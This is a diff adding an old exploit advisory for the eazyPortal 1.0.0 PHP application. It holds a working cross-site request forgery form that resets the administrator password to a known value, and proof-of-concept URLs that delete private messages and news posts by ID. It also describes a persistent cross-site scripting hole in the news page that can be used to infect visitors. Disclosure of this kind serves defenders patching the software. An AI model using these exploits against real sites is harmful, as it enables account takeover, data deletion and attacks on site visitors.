@@ -1,0 +1,61 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 02. January 2010.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: eazyPortal
+[#] Version: 1.0.0
+[#] Platform: PHP
+[#] Homepage: http://www.eazyportal.com/
+[#] Vulnerability: Multiple XSRF Vulnerabilities And Persistent XSS
+[#-----------------------------------------------------------------------------------------------#]
+
+[#]Content
+ |--Change admin password
+ |--Add news - Persistent XSS
+ |--Remove private message by id
+ |--Remove news by id
+
+[*]Change admin password
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://host/" enctype="multipart/form-data" method="post">
+  <input type="hidden" name="a" value="profile"/>
+  <input type="hidden" name="uname" value="admin"/>
+  <input type="hidden" name="uavatar" value=""/>
+  <input type="hidden" name="uemail"  value="e@mail.com"/>
+  <input type="hidden" name="upwd" value="hacked"/>
+  <input type="hidden" name="ucpwd" value="hacked"/>
+  <input type="hidden" name="ulocation" value="moon"/>
+  <input type="hidden" name="usignature" value="free your mind and the
+ass will follow"/>
+  <input type="hidden" name="ushowemail" value="0"/>
+  <input type="hidden" name="ugmt" value="0"/>
+  <input type="hidden" name="ufile"/>
+  <input type="image"
+src="http://host/tpl/DefaultGreen/img/button_submit.gif"
+name="submit"/>
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[+]Add news - Persistent XSS
+
+http://host/index.php?a=administrator&p=news&s=add
+
+There we can add new news that can be seen on main page. It is
+vulnerable to persistent xss and
+attacker can use this to infect website visitors.
+
+[-]Remove private message by id
+
+[POC----------------------------------------------------------------------------------------------]
+http://host/index.php?a=private&inbox=&d=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]Remove news by id
+
+[POC----------------------------------------------------------------------------------------------]
+http://host/index.php?a=administrator&p=news&del=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[#] EOF
